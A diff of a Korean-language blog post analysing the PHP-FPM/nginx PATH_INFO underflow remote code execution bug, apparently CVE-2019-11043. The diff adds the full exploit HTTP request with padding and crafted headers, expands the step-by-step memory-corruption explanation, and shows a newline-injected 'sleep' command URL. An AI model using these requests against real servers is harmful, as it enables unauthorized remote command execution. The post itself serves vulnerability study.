@@ -67,17 +67,32 @@ nameserver 8.8.8.8 추가
 <center>취약점을 통해 파일 작성 후 원격 코드 실행 화면</center>
 
 ## 취약점에 대한 간단한 설명을 먼저 해보자.
-
+  
+```xml 
+GET /index.php/PHP_VALUE%0Asession.auto_start=0;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0
+D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
+Ebut: mamku tvoyu
+```
 1. `fastcgi_split_path_info` 정규표현식을 이용하여 `PATH_INFO(env_path_info)`에 `개행`문자를 삽입한다.
-2. 정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 되어 `path_info`변수가 `Underflow`값으로 초기된다.
-3. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
-4. `path_info`가 PHP-FPM의 CGI 환경구조체인 `fcgi_data_set`의 `pos` 주소를 가리키도록 설정한다.(추후 공격시, `pos`주소 까지의 offset을 맞춘다면 set-cookie 헤더를 확인할 수 있다.)
-5. `path_info[0] = 0`구문을 통해 `fcgi_data_set->pos`가 `fcgi_data_set`의 중간을 가리키도록 한 후(ex: 0x5565785546`82` -> 0x5565785546`00`), `FCGI_PUTENV`함수를 통해 기존 CGI환경을 덮어쓸 수 있다.
-6. `fcgi_hash_buckt`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시를 가진 더미 헤더를 생성하고, HTTP요청에 더미 헤더와 값을 작성한다.
-7. PHP-FPM은 페이지 렌더링 과정에서 변조된 `PHP_VALUE`값으로 `FCGI_PUTENV`함수를 실행하고, 변조된 값은 `PHP ini`파일에 작성된다.
-8. 변조하려는 값은 공격 체인으로 구성하여, 원격 명령 제어를 위한 설정을 만들 수 있다.
-9. `PHP ini`에 설정이 완료되었다면, 공격자가 지정한 파라미터를 통해 원격 명령 실행이 가능하다.
+2. 정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 되어 `path_info`변수가 특정 `Underflow`값으로 초기된다.
+3. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `[1222번째 줄]path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
+4. `path_info`가 PHP-FPM의 CGI 환경구조체인 `fcgi_data_seg`의 `pos` 주소를 가리키도록 설정한다.(추후 공격시, `pos`주소 까지의 offset을 맞춘다면 set-cookie 헤더를 확인할 수 있다.)
+5. `FCGI_PUTENV(char *name, char *value)`는 `nginx`와 `fastcgi`가 통신할때 사용하는 전역변수에 들어있는 구조체(`fcgi_data_seg`)에서 해쉬(`hash_value`)를 검색하여
+메모리의 힙에 로드된 해쉬버킷(`fcgi_hash_buket`)값을 수정한다(fcgi_hash_set함수).
+6. `fcgi_hash_buckt`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시값을 가진 더미헤더 `HTTP_EBUT`을 찾아낸다.
+7. `D-Fisos`헤더는 `Ebut`헤더가 특정위치에 들어갈 수 있도록 자리를 차지하는 역할이며, `Ebut`은 `fastcgi_params`에 정의된 전역변수 `HTTP_EBUT`으로 자동으로 바뀐다
+8. `FCGI_PUTENV`의 `fcgi_hash_set`에서, 특정 헤시테이블의 `has_value`와 변수이름의 `길이`가 동일하면 새로운 변수와 값으로 덮어쓸 수 있다.
+9. `HTTP_EBUT`의 주소를 `D-Fiso`s헤더를 통해 수정될 `fcgi_data_seg->pos`주소와 `같은 버퍼(fcgi_data_seg)`안에 위치하도록 `유도`하고, 수정된 `fcgi_data_seg->pos` 값과 `[1226번째 줄]FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name)` 구문을 통해 `"PHP_VALUE\nsessi.."`를 포함한 `나머지 fcgi_data_seg`가 작성된다면,
+`fcgi_data_seg`에서 `HTTP_EBUT`과 `값`은 `PHP_VALUE`와 `%0A로 구분되어지는 값`으로 덮어씌어 진다(`PUT`).
+10. 물론, PHP-FPM은 HTTP_EBUT과 PHP_VALUE의 hash_value, var_len이 동일하여 같은 헤더로 인식했기 때문에 가능하다.
+11. `[1326번째 줄]ini = FCGI_GETENV(request, "PHP_VALUE")` 구문을 통해 헤쉬버킷에서 `변조된 PHP_VALUE`를 검색하여 `ini stuff`로 가져오며, `PHP ini`파일에 작성한다.
+12. `PHP ini`에 변조하려는 값을 공격 체인으로 구성한다면, 원격 명령 제어를 위한 설정을 만들 수 있다. 또한 이를 통해, 다양한 원격 명령 실행이 가능하다.
+
+
 * 공격 페이로드는 [여기로](https://chanbin.github.io/threat/2019/12/26/php-fpm-payload)가면 볼 수 있다.
+
 
 ## 이제 제대로 분석하자. 
 
@@ -346,7 +361,7 @@ extension = "$\_GET[a]\`?>" <br>
 
 PHP는 Nginx에서 독립된 패키지 이므로, Nginx가 PHP 스크립트를 처리하도록 하려면 구성에 몇가지 설정이 필요하다.
 1. `PATH_INFO`가 제공되어야한다. Nginx configuration에서 `fastcgi_param PATH_INFO $xxxx` 문구가 기본 기능에 포함되지 않는다.
-2. PHP-FPM에 요청을 보내기 위해 관리자는 location의 정규표현식을 URI에 맞도록 변경해한다. location 정규표현식은 일반적으로 2가지가 있다.
+2. PHP-FPM에 요청을 보내기 위해 관리자는 location의 정규표현식을 URI에 맞도록 변경해한다. location 정규표현식은 일반적으로 2가지가 있다.  
 ```php
 # Nginx 공식 설명서의 설정
 location ~ [^/]\.php(/|$) {
@@ -359,9 +374,9 @@ location ~ \.php$ {
 }
 
 두가지는 비슷해보이지만 공격코드는 완전히 달라진다.
-``` 
-3. 파일이 존재하는지 확인하는 기능을 지워야한다. 기본적인 Nginx환경에서 아래와 같이 파일이 존재하는지 확인하고 PHP-FPM에 보낸다. 또는 확장성이나 성능 문제로 Nginx와 PHP-FPM이 동일한 서버에 있지 않다면, 경로가 달라 파일을 확인하지 못한다.
-```php
+```  
+3. 파일이 존재하는지 확인하는 기능을 지워야한다. 기본적인 Nginx환경에서 아래와 같이 파일이 존재하는지 확인하고 PHP-FPM에 보낸다. 또는 확장성이나 성능 문제로 Nginx와 PHP-FPM이 동일한 서버에 있지 않다면, 경로가 달라 파일을 확인하지 못한다.  
+```php  
 location ~ [^/]\.php(/|$) {
     fastcgi_split_path_info ^(.+?\.php)(/.*)$;
     ...
@@ -374,8 +389,8 @@ location ~ [^/]\.php(/|$) {
 	try_files $fastcgi_script_name =404;
     ...
 }
-``` 
-4. 기본적인 공격의 컨셉은 `QUERY_STRING`의 길이를 증가시켜 버퍼를 조정하고 언더플로우 시키는 것이다. 하지만 `PATH_INFO`가 `QUERY_STRING`보다 먼저 온다면 `PATH_INFO`의 정규표현식에 잘려서 공격이 성공하지 못한다. 예시는 아래와 같다.
+```  
+4. 기본적인 공격의 컨셉은 `QUERY_STRING`의 길이를 증가시켜 버퍼를 조정하고 언더플로우 시키는 것이다. 하지만 `PATH_INFO`가 `QUERY_STRING`보다 먼저 온다면 `PATH_INFO`의 정규표현식에 잘려서 공격이 성공하지 못한다. 예시는 아래와 같다.  
 ```php
 # /etc/nginx/sites-enabled/nginx.conf 
 
@@ -423,17 +438,17 @@ fastcgi_param  CONTENT_LENGTH     $content_length;
 `pos`값을 키우기 위해 `QUERY_STRING`에 매우 긴 문자열`(Q...)`을 보내 PHP-FPM이 새 버퍼를 할당하도록 하고, PHP-FPM이 새 버퍼에 `PATH_INFO`를 작성하도록 한다.
 
 `PATH_INFO`가 `fcgi_data_seg->data`의 상단에 있는 한, `fcgi_data_seg->pos`까지의 오프셋은 `34`이다. HTTP 요청에서 underflow로 `PATH_INFO`의 값을 `*PATH_INFO+34`로 맞추면 `fcgi_data_seg->pos`에 널바이트를 설정할 수 있다.(기본 HTTP_HEADER 삭제)<br>
-또한, `PHP_VALUE`값 수정을 위한 충분한 길이의 더미 헤더(HTTP_DUMMY_HEADERSSS 또는 D-Pisos)와 그 값('A' 11번 반복 또는 8=====...====D)을 HTTP 요청에 작성했다면, `PHP_VALUE`의 값을 `HTTP_EBUT`을 통해 `PHP_VALUE\nsession.auto_start=1;;;`등으로 정확하게 덮어쓸 수 있다.
-```bash
+또한, `PHP_VALUE`값 수정을 위한 충분한 길이의 더미 헤더(HTTP_DUMMY_HEADERSSS 또는 D-Pisos)와 그 값('A' 11번 반복 또는 8=====...====D)을 HTTP 요청에 작성했다면, `PHP_VALUE`의 값을 `HTTP_EBUT`을 통해 `PHP_VALUE\nsession.auto_start=1;;;`등으로 정확하게 덮어쓸 수 있다.   
+```bash  
 GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
 Host: 127.0.0.1:8080
 User-Agent: Mozilla/5.0
 D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
 Ebut: mamku tvoyu
-```
+```  
 
-세션 렌더링 중에 위의 공격대로 auto_start를 성공적으로 변경했다면, set-cookie 헤더를 확인할 수 있다.
-```
+세션 렌더링 중에 위의 공격대로 auto_start를 성공적으로 변경했다면, set-cookie 헤더를 확인할 수 있다.  
+```http  
 (스캔중)
 HTTP/1.1 200 OK
 Server: nginx/1.17.6
@@ -455,7 +470,7 @@ Set-Cookie: PHPSESSID=cb493c52683ceaf5f75cb3e9a63698d3; path=/
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
 Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
-```
+```  
 
 ### 3. 길이 제한
 
@@ -476,20 +491,34 @@ Pragma: no-cache
 
 ### 3. 길이제한 우회
 
-`fsgi_data_seg->pos`를 가리키기위한 길이 제한을 우회하려면 new line 문자를 이용하여 임의의 명령을 실행하는 방법이 있다.
+`fsgi_data_seg->pos`를 가리키기위한 길이 제한을 우회하려면 new line 문자를 이용하여 임의의 명령을 실행하는 방법이 있다.   
 ```http
 http://localhost/index.php?a=%0asleep+5%0a
 ```
 
 ## 다시 정리해보는 취약점에 대한 간단한 설명
-
+  
+```xml   
+GET /index.php/PHP_VALUE%0Asession.auto_start=0;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0
+D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
+Ebut: mamku tvoyu
+```
 1. `fastcgi_split_path_info` 정규표현식을 이용하여 `PATH_INFO(env_path_info)`에 `개행`문자를 삽입한다.
-2. 정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 되어 `path_info`변수가 `Underflow`값으로 초기된다.
-3. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
-4. `path_info`가 PHP-FPM의 CGI 환경구조체인 `fcgi_data_set`의 `pos` 주소를 가리키도록 설정한다.(추후 공격시, `pos`주소 까지의 offset을 맞춘다면 set-cookie 헤더를 확인할 수 있다.)
-5. `path_info[0] = 0`구문을 통해 `fcgi_data_set->pos`가 `fcgi_data_set`의 중간을 가리키도록 한 후(ex: 0x5565785546`82` -> 0x5565785546`00`), `FCGI_PUTENV`함수를 통해 기존 CGI환경을 덮어쓸 수 있다.
-6. `fcgi_hash_buckt`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시를 가진 더미 헤더를 생성하고, HTTP요청에 더미 헤더와 값을 작성한다.
-7. PHP-FPM은 페이지 렌더링 과정에서 변조된 `PHP_VALUE`값으로 `FCGI_PUTENV`함수를 실행하고, 변조된 값은 `PHP ini`파일에 작성된다.
-8. 변조하려는 값은 공격 체인으로 구성하여, 원격 명령 제어를 위한 설정을 만들 수 있다.
-9. `PHP ini`에 설정이 완료되었다면, 공격자가 지정한 파라미터를 통해 원격 명령 실행이 가능하다.
+2. 정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 되어 `path_info`변수가 특정 `Underflow`값으로 초기된다.
+3. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `[1222번째 줄]path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
+4. `path_info`가 PHP-FPM의 CGI 환경구조체인 `fcgi_data_seg`의 `pos` 주소를 가리키도록 설정한다.(추후 공격시, `pos`주소 까지의 offset을 맞춘다면 set-cookie 헤더를 확인할 수 있다.)
+5. `FCGI_PUTENV(char *name, char *value)`는 `nginx`와 `fastcgi`가 통신할때 사용하는 전역변수에 들어있는 구조체(`fcgi_data_seg`)에서 해쉬(`hash_value`)를 검색하여
+메모리의 힙에 로드된 해쉬버킷(`fcgi_hash_buket`)값을 수정한다(fcgi_hash_set함수).
+6. `fcgi_hash_buckt`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시값을 가진 더미헤더 `HTTP_EBUT`을 찾아낸다.
+7. `D-Fisos`헤더는 `Ebut`헤더가 특정위치에 들어갈 수 있도록 자리를 차지하는 역할이며, `Ebut`은 `fastcgi_params`에 정의된 전역변수 `HTTP_EBUT`으로 자동으로 바뀐다
+8. `FCGI_PUTENV`의 `fcgi_hash_set`에서, 특정 헤시테이블의 `has_value`와 변수이름의 `길이`가 동일하면 새로운 변수와 값으로 덮어쓸 수 있다.
+9. `HTTP_EBUT`의 주소를 `D-Fiso`s헤더를 통해 수정될 `fcgi_data_seg->pos`주소와 `같은 버퍼(fcgi_data_seg)`안에 위치하도록 `유도`하고, 수정된 `fcgi_data_seg->pos` 값과 `[1226번째 줄]FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name)` 구문을 통해 `"PHP_VALUE\nsessi.."`를 포함한 `나머지 fcgi_data_seg`가 작성된다면,
+`fcgi_data_seg`에서 `HTTP_EBUT`과 `값`은 `PHP_VALUE`와 `%0A로 구분되어지는 값`으로 덮어씌어 진다(`PUT`).
+10. 물론, PHP-FPM은 HTTP_EBUT과 PHP_VALUE의 hash_value, var_len이 동일하여 같은 헤더로 인식했기 때문에 가능하다.
+11. `[1326번째 줄]ini = FCGI_GETENV(request, "PHP_VALUE")` 구문을 통해 헤쉬버킷에서 `변조된 PHP_VALUE`를 검색하여 `ini stuff`로 가져오며, `PHP ini`파일에 작성한다.
+12. `PHP ini`에 변조하려는 값을 공격 체인으로 구성한다면, 원격 명령 제어를 위한 설정을 만들 수 있다. 또한 이를 통해, 다양한 원격 명령 실행이 가능하다.
+
+
 * 공격 페이로드는 [여기로](https://chanbin.github.io/threat/2019/12/26/php-fpm-payload)가면 볼 수 있다.
